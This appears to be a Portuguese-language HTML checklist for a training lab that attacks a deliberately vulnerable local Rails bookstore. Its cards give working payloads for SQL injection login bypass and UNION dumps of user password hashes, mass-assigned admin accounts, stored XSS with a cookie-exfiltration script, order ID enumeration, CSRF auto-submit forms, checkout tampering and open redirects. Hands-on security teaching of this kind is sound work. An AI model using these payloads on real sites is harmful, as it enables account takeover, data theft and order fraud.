@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <title>BookStore Attack Lab — Checklist</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=DM+Sans:wght@400;500&display=swap"
+    rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0a0c10;
+      --bg2: #0f1117;
+      --bg3: #161b22;
+      --border: #21262d;
+      --border2: #30363d;
+      --text: #e6edf3;
+      --muted: #7d8590;
+      --red: #ff6b6b;
+      --green: #3fb950;
+      --blue: #58a6ff;
+      --amber: #e3b341;
+      --mono: 'IBM Plex Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+    }
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      padding: 2rem;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+
+    .header {
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1.5rem;
+      margin-bottom: 2rem;
+      background: var(--bg2);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .header::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, var(--red), var(--amber));
+    }
+
+    .eyebrow {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--muted);
+      margin-bottom: 8px;
+    }
+
+    .title {
+      font-size: 22px;
+      font-weight: 500;
+      margin-bottom: 6px;
+    }
+
+    .subtitle {
+      font-size: 13px;
+      color: var(--muted);
+    }
+
+    .story-blurb {
+      font-size: 13px;
+      color: #9ea8b3;
+      line-height: 1.6;
+      margin-top: 12px;
+      padding-top: 12px;
+      border-top: 1px solid var(--border);
+    }
+
+    .meta-row {
+      display: flex;
+      gap: 1rem;
+      margin-top: 1rem;
+      flex-wrap: wrap;
+    }
+
+    .meta {
+      font-family: var(--mono);
+      font-size: 11px;
+      padding: 3px 10px;
+      border-radius: 20px;
+      border: 1px solid;
+    }
+
+    .m-r {
+      color: var(--red);
+      border-color: rgba(255, 107, 107, 0.3);
+      background: rgba(255, 107, 107, 0.08);
+    }
+
+    .m-a {
+      color: var(--amber);
+      border-color: rgba(227, 179, 65, 0.3);
+      background: rgba(227, 179, 65, 0.08);
+    }
+
+    .m-g {
+      color: var(--green);
+      border-color: rgba(63, 185, 80, 0.3);
+      background: rgba(63, 185, 80, 0.07);
+    }
+
+    .track-head {
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--muted);
+      letter-spacing: 0.28px;
+      margin: 1.75rem 0 0.65rem 0;
+      padding-bottom: 6px;
+      border-bottom: 1px solid var(--border);
+      text-transform: uppercase;
+    }
+
+    .track-head:first-of-type {
+      margin-top: 0;
+    }
+
+    .vuln-card {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      margin-bottom: 1rem;
+      overflow: hidden;
+    }
+
+    .vuln-head {
+      padding: 1rem 1.25rem;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 1rem;
+    }
+
+    .vuln-num {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+      background: var(--bg3);
+      padding: 3px 8px;
+      border-radius: 6px;
+      border: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+
+    .vuln-title {
+      font-size: 15px;
+      font-weight: 500;
+    }
+
+    .owasp-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 5px;
+      text-align: right;
+      max-width: 48%;
+    }
+
+    .vuln-owasp {
+      font-family: var(--mono);
+      font-size: 10px;
+      padding: 2px 8px;
+      border-radius: 20px;
+      border: 1px solid rgba(255, 107, 107, 0.3);
+      color: var(--red);
+      background: rgba(255, 107, 107, 0.08);
+      white-space: nowrap;
+    }
+
+    .owasp-note {
+      font-family: var(--sans);
+      font-size: 10px;
+      color: var(--muted);
+      line-height: 1.4;
+      max-width: 240px;
+    }
+
+    .vuln-body {
+      padding: 1.25rem;
+    }
+
+    .vuln-target {
+      font-family: var(--mono);
+      font-size: 11px;
+      color: var(--muted);
+      margin-bottom: 12px;
+    }
+
+    .vuln-target span {
+      color: var(--blue);
+    }
+
+    details.lab-details {
+      margin: 0 0 12px 0;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 0.65rem 0.85rem;
+      background: var(--bg3);
+    }
+
+    details.lab-details summary {
+      cursor: pointer;
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--amber);
+    }
+
+    details.lab-details .hint-inner {
+      margin-top: 10px;
+      font-size: 12px;
+      color: #c9d1d9;
+      line-height: 1.55;
+    }
+
+    .payload-box {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 0.875rem 1rem;
+      margin: 0.75rem 0;
+      font-family: var(--mono);
+      font-size: 12px;
+      color: #c9d1d9;
+      line-height: 1.55;
+      overflow-x: auto;
+    }
+
+    .payload-box .payload-line {
+      display: block;
+      margin: 0;
+      padding: 0;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    .payload-box .payload-indent {
+      display: block;
+      padding-left: 1.25rem;
+      margin: 0;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    .payload-box .payload-spacer {
+      margin-top: 0.45rem;
+    }
+
+    .payload-label {
+      font-family: var(--mono);
+      font-size: 9px;
+      color: var(--muted);
+      margin-bottom: 6px;
+      letter-spacing: 0.4px;
+    }
+
+    .success-line {
+      font-size: 11px;
+      color: var(--green);
+      margin-top: 10px;
+      font-family: var(--mono);
+      line-height: 1.45;
+    }
+
+    .chain-note {
+      font-size: 11px;
+      color: #9ea8b3;
+      margin-top: 8px;
+      font-style: italic;
+      line-height: 1.45;
+    }
+
+    .c-comment {
+      color: #6e7681;
+    }
+
+    .c-cmd {
+      color: var(--green);
+    }
+
+    .c-str {
+      color: #a5d6ff;
+    }
+
+    .c-danger {
+      color: var(--red);
+      font-weight: 600;
+    }
+
+    .bonus-box {
+      background: rgba(227, 179, 65, 0.07);
+      border: 1px solid rgba(227, 179, 65, 0.25);
+      border-radius: 10px;
+      padding: 1.25rem;
+      margin-top: 2rem;
+    }
+
+    .bonus-title {
+      font-family: var(--mono);
+      font-size: 12px;
+      color: var(--amber);
+      margin-bottom: 0.75rem;
+    }
+
+    .bonus-text {
+      font-size: 13.5px;
+      color: #c9982a;
+      line-height: 1.6;
+    }
+
+    .failure-list {
+      margin-top: 10px;
+      padding-left: 1.15rem;
+      font-size: 12px;
+      color: #c9d1d9;
+      line-height: 1.5;
+    }
+
+    .failure-list li {
+      margin: 5px 0;
+    }
+
+    .cookie-appendix {
+      margin-top: 12px;
+      padding: 0.75rem 1rem;
+      border: 1px dashed var(--border2);
+      border-radius: 8px;
+      font-size: 12px;
+      color: #c9d1d9;
+      line-height: 1.55;
+    }
+
+    .cookie-appendix summary {
+      cursor: pointer;
+      font-family: var(--mono);
+      font-size: 10px;
+      color: var(--blue);
+    }
+
+    @media print {
+      body {
+        background: white;
+        color: black;
+        padding: 1rem;
+      }
+
+      .payload-box {
+        background: #f5f5f5;
+        color: #333;
+        border-color: #ccc;
+      }
+
+      .vuln-card {
+        border-color: #ccc;
+      }
+
+      .header {
+        border-color: #ccc;
+      }
+
+      details.lab-details {
+        border-color: #ccc;
+      }
+
+      details.lab-details summary {
+        list-style: none;
+      }
+
+      details.lab-details summary::after {
+        content: "";
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="header">
+    <div class="eyebrow">// encontro 01 · segurança rails · modo ataque</div>
+    <div class="title">BookStore Attack Lab</div>
+    <div class="subtitle">Missão única em camadas — da conta ao checkout, contra uma loja que confia demais no cliente.</div>
+    <div class="story-blurb">
+      <strong>Cenário:</strong> a rival <em>BookRip</em> quer vitória fácil: roubar dados, fraudar pedidos e plantar narrativa falsa.
+      Cada cartão abaixo é um ângulo realista; alguns encadeiam naturalmente (ex.: sessão privilegiada depois do login).
+      <strong>Ferramentas típicas:</strong> navegador · <span style="font-family:var(--mono);font-size:11px;">curl</span>
+      · opcionalmente <span style="font-family:var(--mono);font-size:11px;">bin/rails runner</span> onde indicado.
+    </div>
+  </div>
+
+  <div class="bonus-box"
+    style="margin-bottom:2rem;background:rgba(88,166,255,0.06);border-color:rgba(88,166,255,0.25);">
+    <div class="bonus-title" style="color:var(--blue);">// antes de começar — preparação</div>
+    <div class="bonus-text" style="color:#8cb8ff;line-height:1.65;">
+      <div>Rode na raiz do projeto (uma vez): <span style="font-family:var(--mono);font-size:12px;">bin/rails db:prepare
+          db:seed</span></div>
+      <div style="margin-top:0.5rem;">Credenciais de exemplo no seed: <strong>admin@bookstore.com</strong> /
+        <strong>password123</strong> · <strong>alice@user.com</strong> / <strong>pass123</strong> ·
+        <strong>bob@user.com</strong> / <strong>pass123</strong>
+      </div>
+      <div style="margin-top:0.5rem;">Servidor: <span
+          style="font-family:var(--mono);font-size:12px;">http://localhost:3000</span>. Reinicie <span
+          style="font-family:var(--mono);font-size:12px;">rails s</span> após mudanças em código.</div>
+      <div style="margin-top:0.5rem;">Este checklist cobre <strong>9</strong> falhas documentadas (checkout junta preço +
+        status em um item).</div>
+      <details class="cookie-appendix">
+        <summary style="color:var(--blue);font-family:var(--mono);font-size:11px;">// sessão Alice · alice_cookies.txt
+          (reutilize nos itens que precisam de cookie)</summary>
+        <div style="margin-top:10px;font-family:var(--mono);font-size:11px;color:#c9d1d9;line-height:1.55;">
+          <span class="c-cmd">curl</span> -c alice_cookies.txt -X POST http://localhost:3000/login \<br>
+          &nbsp;&nbsp;--data-urlencode <span class="c-str">"email=alice@user.com"</span> \<br>
+          &nbsp;&nbsp;--data-urlencode <span class="c-str">"password=pass123"</span>
+        </div>
+      </details>
+      <div style="margin-top:0.85rem;font-size:12px;color:#a8c6ff;"><strong>Armadilhas comuns</strong></div>
+      <ul class="failure-list" style="color:#b8c9e8;">
+        <li><span style="font-family:var(--mono);font-size:11px;">'+--+</span> no curl não vira comentário SQL como no
+          navegador; prefira payloads com <span style="font-family:var(--mono);font-size:11px;">OR</span> e <span
+            style="font-family:var(--mono);font-size:11px;">--data-urlencode</span>.</li>
+        <li>Login SQLi com <span style="font-family:var(--mono);font-size:11px;">'--</span> pode gerar 500 neste lab —
+          o cartão 01 usa um OR estável.</li>
+        <li><span style="font-family:var(--mono);font-size:11px;">document.cookie</span> vazio na XSS é esperado se o
+          cookie de sessão for HttpOnly (defesa real — o XSS continua grave).</li>
+        <li>Item com comentário do Bob: rode <span style="font-family:var(--mono);font-size:11px;">db:seed</span> no repo
+          atualizado.</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="track-head">// A · Identidade &amp; privilégio</div>
+
+  <!-- VULN 1 -->
+  <div class="vuln-card">
+    <div class="vuln-head">
+      <div>
+        <div style="margin-bottom:4px;">
+          <span class="vuln-num">01</span>
+        </div>
+        <div class="vuln-title">SQL Injection — Login</div>
+      </div>
+      <div class="owasp-wrap">
+        <span class="vuln-owasp">A03 · Injection</span>
+        <span class="owasp-note">O servidor concatena email/senha na SQL — metacaracteres viram lógica de consulta.</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-target">alvo: <span>POST /login</span> · campo email</div>
+      <details class="lab-details" open>
+        <summary>// modo descoberta — sem colar payload</summary>
+        <div class="hint-inner">Observe como email e senha viram critério de autenticação. O que acontece se o email
+          “fechar aspas” e acrescentar uma condição sempre verdadeira?</div>
+      </details>
+      <div class="payload-label">// PoC — payload</div>
+      <div class="payload-box">
+        <span class="c-comment payload-line"># Texto no campo email (fecha aspas + OR — senha ignorada):</span>
+        <span class="c-danger payload-line">admin@bookstore.com') OR ('1'='1</span>
+        <span class="c-comment payload-line payload-spacer"># Via curl (use --data-urlencode):</span>
+        <span class="payload-line"><span class="c-cmd">curl</span> -c cookies.txt -X POST http://localhost:3000/login
+          \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"email=admin@bookstore.com') OR
+            ('1'='1"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"password=x"</span></span>
+      </div>
+      <div class="success-line">✓ Sucesso: HTTP 302 para / com sessão como admin (confira cookie ou UI).</div>
+      <div class="chain-note">Encadeamento: com sessão admin, explore <span
+          style="font-family:var(--mono);font-size:11px;color:var(--blue);">/admin/users</span> — dados extras para o
+        relatório da BookRip.</div>
+    </div>
+  </div>
+
+  <!-- VULN 2 -->
+  <div class="vuln-card">
+    <div class="vuln-head">
+      <div>
+        <div style="margin-bottom:4px;">
+          <span class="vuln-num">02</span>
+        </div>
+        <div class="vuln-title">Mass Assignment — Criar Admin</div>
+      </div>
+      <div class="owasp-wrap">
+        <span class="vuln-owasp">A04 · Insecure Design</span>
+        <span class="owasp-note">O cadastro aceita campos que deveriam ser só servidor-side (papel, saldo).</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-target">alvo: <span>POST /users</span> · campos <span>role</span> e <span>credits</span></div>
+      <details class="lab-details" open>
+        <summary>// modo descoberta — sem colar payload</summary>
+        <div class="hint-inner">Inspecione o que o signup envia. Quais chaves em <span
+            style="font-family:var(--mono);font-size:11px;">user[…]</span> o servidor realmente aplica ao criar a conta?
+        </div>
+      </details>
+      <div class="payload-label">// PoC — payload</div>
+      <div class="payload-box">
+        <span class="c-comment payload-line"># Email único por execução (evita 422 por uniqueness):</span>
+        <span class="payload-line">LAB_EMAIL=<span class="c-str">"h-$(date +%s)@evil.com"</span></span>
+        <span class="payload-line"><span class="c-cmd">curl</span> -X POST http://localhost:3000/users \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"user[name]=Hacker"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"user[email]=$LAB_EMAIL"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"user[password]=123"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-danger">"user[role]=admin"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-danger">"user[credits]=999999"</span></span>
+        <span class="c-comment payload-line payload-spacer"># Console:</span>
+        <span class="payload-line">User.order(<span class="c-str">created_at: :desc</span>).first.role</span>
+      </div>
+      <div class="success-line">✓ Sucesso: último usuário criado com role <span
+          style="font-family:var(--mono);">admin</span> e credits elevados.</div>
+      <div class="chain-note">Encadeamento: conta nova admin também abre caminho para painéis restritos.</div>
+    </div>
+  </div>
+
+  <div class="track-head">// B · Injeção na UI &amp; vazamento por objeto</div>
+
+  <!-- VULN 3 -->
+  <div class="vuln-card">
+    <div class="vuln-head">
+      <div>
+        <div style="margin-bottom:4px;">
+          <span class="vuln-num">03</span>
+        </div>
+        <div class="vuln-title">XSS Stored — Comentários</div>
+      </div>
+      <div class="owasp-wrap">
+        <span class="vuln-owasp">A03 · Injection</span>
+        <span class="owasp-note">Conteúdo de usuário tratado como HTML — o navegador executa marcas perigosas.</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-target">alvo: <span>POST /books/:id/comments</span> · campo body</div>
+      <details class="lab-details" open>
+        <summary>// modo descoberta — sem colar payload</summary>
+        <div class="hint-inner">Onde o comentário reaparece na página do livro? O servidor escapa HTML por padrão — o que
+          muda quando alguém marca o campo como “seguro” ou usa helpers equivalentes?<br><br>
+          <strong>Nível extra:</strong> teste também um vetor sem <span style="font-family:var(--mono);font-size:11px;">&lt;script&gt;</span>,
+          por exemplo atributo de evento em tag permitida — útil quando filtros bloqueiam só <span
+            style="font-family:var(--mono);font-size:11px;">script</span>.</div>
+      </details>
+      <div class="payload-label">// PoC — payload base</div>
+      <div class="payload-box">
+        <span class="c-danger payload-line">&lt;script&gt;alert('XSS — cookie: ' + document.cookie)&lt;/script&gt;</span>
+        <span class="c-comment payload-line payload-spacer"># Variante “nível 2” (event handler):</span>
+        <span class="c-danger payload-line">&lt;img src=x onerror="alert('xss-event')"&gt;</span>
+        <span class="c-comment payload-line payload-spacer"># HttpOnly: sessão pode não aparecer em document.cookie;
+          XSS continua válido como execução arbitrária.</span>
+        <span class="c-comment payload-line payload-spacer"># Exfil tráfego (cookies não-HttpOnly):</span>
+        <span class="c-danger payload-line">&lt;script&gt;new
+          Image().src='http://localhost:9999/?c='+document.cookie&lt;/script&gt;</span>
+        <span class="payload-line"><span class="c-cmd">python3 -m http.server</span> 9999</span>
+      </div>
+      <div class="success-line">✓ Sucesso: execução ao abrir a página do livro (alert ou event handler).</div>
+    </div>
+  </div>
+
+  <!-- VULN 4 -->
+  <div class="vuln-card">
+    <div class="vuln-head">
+      <div>
+        <div style="margin-bottom:4px;">
+          <span class="vuln-num">04</span>
+        </div>
+        <div class="vuln-title">IDOR — Pedidos de outros usuários</div>
+      </div>
+      <div class="owasp-wrap">
+        <span class="vuln-owasp">A01 · Broken Access Control</span>
+        <span class="owasp-note">O recurso é carregado só pelo ID — falta verificar se o pedido pertence ao usuário atual.</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-target">alvo: <span>GET /orders/:id</span></div>
+      <details class="lab-details" open>
+        <summary>// modo descoberta — sem colar payload</summary>
+        <div class="hint-inner">Em ambientes de demo, IDs são pequenos e previsíveis. Como você passaria de “só meus
+          pedidos” para “qualquer pedido existente” sem permissão extra?<br><br>
+          Dica de mindset: enumeração sistemática (loop ou sequência) costuma achar alvos antes de payloads “inteligentes”.
+        </div>
+      </details>
+      <div class="payload-label">// PoC — enumerar IDs (expanda o intervalo se precisar)</div>
+      <div class="payload-box">
+        <span class="c-comment payload-line"># Use alice_cookies.txt da preparação.</span>
+        <span class="payload-line"><span class="c-cmd">for</span> i <span class="c-cmd">in</span> $(seq 1 12)<span
+            class="c-cmd">;</span> <span class="c-cmd">do</span></span>
+        <span class="payload-indent">echo "=== /orders/$i ==="</span>
+        <span class="payload-indent"><span class="c-cmd">curl</span> -s -b alice_cookies.txt
+          http://localhost:3000/orders/$i | grep -Eo '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}'</span>
+        <span class="payload-line"><span class="c-cmd">done</span></span>
+      </div>
+      <div class="success-line">✓ Sucesso: email ou dados de pedido de outro usuário no HTML (ex.: bob@user.com).</div>
+    </div>
+  </div>
+
+  <div class="track-head">// C · Mesma raiz SQLi, superfície read-only</div>
+
+  <!-- VULN 5 -->
+  <div class="vuln-card">
+    <div class="vuln-head">
+      <div>
+        <div style="margin-bottom:4px;">
+          <span class="vuln-num">05</span>
+        </div>
+        <div class="vuln-title">SQL Injection — Campo de busca</div>
+      </div>
+      <div class="owasp-wrap">
+        <span class="vuln-owasp">A03 · Injection</span>
+        <span class="owasp-note">Mesmo anti-padrão do item 01: string interpolada na SQL — aqui em leitura / busca.</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-target">alvo: <span>GET /search?q=</span> · UNION-based dump</div>
+      <details class="lab-details" open>
+        <summary>// modo descoberta — puzzle do UNION</summary>
+        <div class="hint-inner">Um <span style="font-family:var(--mono);font-size:11px;">UNION</span> só funciona se o
+          número e os tipos das colunas baterem com o <span style="font-family:var(--mono);font-size:11px;">SELECT</span>
+          original dos livros. Como você descobriria quantas colunas existem sem olhar o código-fonte?<br><br>
+          Abordagem clássica: tentar <span style="font-family:var(--mono);font-size:11px;">UNION SELECT NULL,
+            NULL, …</span> aumentando até a busca responder sem erro (neste lab, 9 colunas = tabela <span
+            style="font-family:var(--mono);font-size:11px;">books</span>).</div>
+      </details>
+      <div class="payload-label">// PoC — dump de usuários (9 colunas)</div>
+      <div class="payload-box">
+        <span class="payload-line"><span class="c-cmd">curl</span> --get http://localhost:3000/search \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"q=<span class="c-danger">' UNION SELECT
+              id,email,password_digest,name,1.0,role,credits,datetime('now'),datetime('now') FROM users --
+            </span>"</span></span>
+      </div>
+      <div class="success-line">✓ Sucesso: dados de usuários misturados aos cards de livro na resposta HTML.</div>
+    </div>
+  </div>
+
+  <div class="track-head">// D · Integridade web &amp; checkout</div>
+
+  <!-- VULN 6 -->
+  <div class="vuln-card">
+    <div class="vuln-head">
+      <div>
+        <div style="margin-bottom:4px;">
+          <span class="vuln-num">06</span>
+        </div>
+        <div class="vuln-title">CSRF ausente — navegador &amp; servidor</div>
+      </div>
+      <div class="owasp-wrap">
+        <span class="vuln-owasp">A05 · Misconfiguration</span>
+        <span class="owasp-note">Proteção contra falsificação de requisição desligada — mudanças de estado aceitas sem
+          token anti-CSRF.</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-target">alvo: <span>ApplicationController</span> · <span>verify_authenticity_token</span>
+        ignorado</div>
+      <details class="lab-details" open>
+        <summary>// modo descoberta — por que “curl com cookie” não é o único cenário</summary>
+        <div class="hint-inner">CSRF real costuma ser um <strong>site atacante</strong> que seu navegador visita enquanto
+          você ainda tem sessão na loja: um <span style="font-family:var(--mono);font-size:11px;">&lt;form&gt;</span> que
+          envia POST automaticamente. O curl abaixo prova o lado servidor; o HTML prova o fluxo browser.<br><br>
+          Salve o snippet como <span style="font-family:var(--mono);font-size:11px;">evil-csrf.html</span>, abra no
+          navegador estando logado em localhost em outra aba (comportamento pode variar por SameSite/navegador — compare com
+          o PoC curl).</div>
+      </details>
+      <div class="payload-label">// PoC A — página HTML maliciosa (auto-submit)</div>
+      <div class="payload-box">
+        <span class="payload-line">&lt;form id="x" action="http://localhost:3000/orders" method="POST"&gt;</span>
+        <span class="payload-line">&nbsp;&nbsp;&lt;input name="total" value="0.77"&gt;</span>
+        <span class="payload-line">&nbsp;&nbsp;&lt;input name="address" value="BookRip CSRF"&gt;</span>
+        <span class="payload-line">&nbsp;&nbsp;&lt;input name="card_number" value="4111111111111111"&gt;</span>
+        <span class="payload-line">&lt;/form&gt;</span>
+        <span class="payload-line">&lt;script&gt;document.getElementById('x').submit()&lt;/script&gt;</span>
+      </div>
+      <div class="payload-label">// PoC B — curl (sem Authenticity-Token, cookie Alice da preparação)</div>
+      <div class="payload-box">
+        <span class="payload-line"><span class="c-cmd">curl</span> -b alice_cookies.txt -X POST
+          http://localhost:3000/orders \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"total=0.50"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"address=Rua CSRF"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"card_number=4111111111111111"</span></span>
+      </div>
+      <div class="success-line">✓ Sucesso: novo pedido criado sem token CSRF (via HTML ou 302 no curl).</div>
+    </div>
+  </div>
+
+  <!-- VULN 7 merged -->
+  <div class="vuln-card">
+    <div class="vuln-head">
+      <div>
+        <div style="margin-bottom:4px;">
+          <span class="vuln-num">07</span>
+        </div>
+        <div class="vuln-title">Abuso do checkout — preço &amp; status</div>
+      </div>
+      <div class="owasp-wrap">
+        <span class="vuln-owasp">A04 · Insecure Design</span>
+        <span class="owasp-note">O servidor confia em campos que deveriam ser calculados no backend ou por máquina de
+          estados.</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-target">alvo: <span>POST /orders</span> · parâmetros <span>total</span> e <span>status</span></div>
+      <details class="lab-details" open>
+        <summary>// modo descoberta — sem colar payload</summary>
+        <div class="hint-inner">Se você controlasse o corpo bruto do POST de checkout, quais campos “financeiros” ou de
+          logística não deveriam jamais vir do cliente?</div>
+      </details>
+      <div class="payload-label">// PoC A — total arbitrário</div>
+      <div class="payload-box">
+        <span class="payload-line"><span class="c-cmd">curl</span> -b alice_cookies.txt -X POST
+          http://localhost:3000/orders \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-danger">"total=0.01"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"address=Endereco fake"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"card_number=4242424242424242"</span></span>
+      </div>
+      <div class="success-line">✓ Sucesso (A): página do pedido mostra total <span
+          style="font-family:var(--mono);">0.01</span>.</div>
+      <div class="payload-label">// PoC B — status entregue sem fluxo real</div>
+      <div class="payload-box">
+        <span class="payload-line"><span class="c-cmd">curl</span> -b alice_cookies.txt -X POST
+          http://localhost:3000/orders \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"total=10"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"address=Rua Status"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"card_number=4000000000000002"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-danger">"status=delivered"</span></span>
+      </div>
+      <div class="success-line">✓ Sucesso (B): novo pedido aparece como <span
+          style="font-family:var(--mono);">delivered</span> imediatamente.</div>
+    </div>
+  </div>
+
+  <!-- VULN 8 -->
+  <div class="vuln-card">
+    <div class="vuln-head">
+      <div>
+        <div style="margin-bottom:4px;">
+          <span class="vuln-num">08</span>
+        </div>
+        <div class="vuln-title">Open Redirect — phishing pós-login</div>
+      </div>
+      <div class="owasp-wrap">
+        <span class="vuln-owasp">A01 · Broken Access Control</span>
+        <span class="owasp-note">Destino do redirect após login veio do cliente — link “confiável” pode mandar para clone
+          malicioso.</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-target">alvo: <span>POST /login</span> · parâmetro <span>return_to</span></div>
+      <details class="lab-details" open>
+        <summary>// modo descoberta — narrativa phishing</summary>
+        <div class="hint-inner">Imagine um email: “confirme sua conta na BookStore” com um POST ou formulário que já inclui
+          credenciais falsas — ou combine com login legítimo e observe para onde o app redireciona após sucesso. Um operador
+          combina isso com página clone para roubar sessão ou segunda senha.</div>
+      </details>
+      <div class="payload-label">// PoC — inspecionar Location</div>
+      <div class="payload-box">
+        <span class="payload-line"><span class="c-cmd">curl</span> -s -D - -o /dev/null -X POST
+          http://localhost:3000/login \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"email=alice@user.com"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-str">"password=pass123"</span> \</span>
+        <span class="payload-indent">--data-urlencode <span class="c-danger">"return_to=https://example.com/phish"</span></span>
+      </div>
+      <div class="success-line">✓ Sucesso: HTTP 302 com <span style="font-family:var(--mono);">Location</span> para o host
+        externo malicioso.</div>
+    </div>
+  </div>
+
+  <div class="track-head">// E · Integridade de conteúdo (horizontal)</div>
+
+  <!-- VULN 9 -->
+  <div class="vuln-card">
+    <div class="vuln-head">
+      <div>
+        <div style="margin-bottom:4px;">
+          <span class="vuln-num">09</span>
+        </div>
+        <div class="vuln-title">Quebra de autorização — apagar comentário de outro usuário</div>
+      </div>
+      <div class="owasp-wrap">
+        <span class="vuln-owasp">A01 · Broken Access Control</span>
+        <span class="owasp-note">Destroy só verifica existência do comentário — não prova que o autor é você.</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="vuln-target">alvo: <span>DELETE /books/:book_id/comments/:id</span></div>
+      <details class="lab-details" open>
+        <summary>// modo descoberta — sem runner</summary>
+        <div class="hint-inner">Logado como Alice, abra a página do livro onde Bob comentou (seed). Use “Exibir código
+          fonte” ou DevTools: links <span style="font-family:var(--mono);font-size:11px;">remover</span> expõem <span
+            style="font-family:var(--mono);font-size:11px;">/books/…/comments/…</span> — copie IDs direto do HTML.<br><br>
+          Alternativa console (opcional): expanda para ver o one-liner <span
+            style="font-family:var(--mono);font-size:11px;">rails runner</span>.</div>
+      </details>
+      <details class="lab-details">
+        <summary>// opcional · rails runner para BOOK_ID e COMMENT_ID</summary>
+        <div class="hint-inner">
+          <span class="payload-line" style="font-family:var(--mono);font-size:11px;"><span
+              class="c-cmd">bin/rails runner</span> <span
+              class="c-str">'c=Comment.joins(:user).find_by(users:{email:&quot;bob@user.com&quot;});abort(&quot;rode db:seed&quot;)unless c;puts&quot;#{c.book_id} #{c.id}&quot;'</span></span>
+        </div>
+      </details>
+      <div class="payload-label">// PoC — DELETE (substitua pelos IDs)</div>
+      <div class="payload-box">
+        <span class="payload-line"><span class="c-cmd">curl</span> -b alice_cookies.txt -X DELETE \</span>
+        <span class="payload-indent">http://localhost:3000/books/<span class="c-danger">BOOK_ID</span>/comments/<span
+            class="c-danger">COMMENT_ID</span></span>
+      </div>
+      <div class="success-line">✓ Sucesso: 302 de volta ao livro e comentário do outro usuário removido para todos.</div>
+    </div>
+  </div>
+</body>
+
+</html>
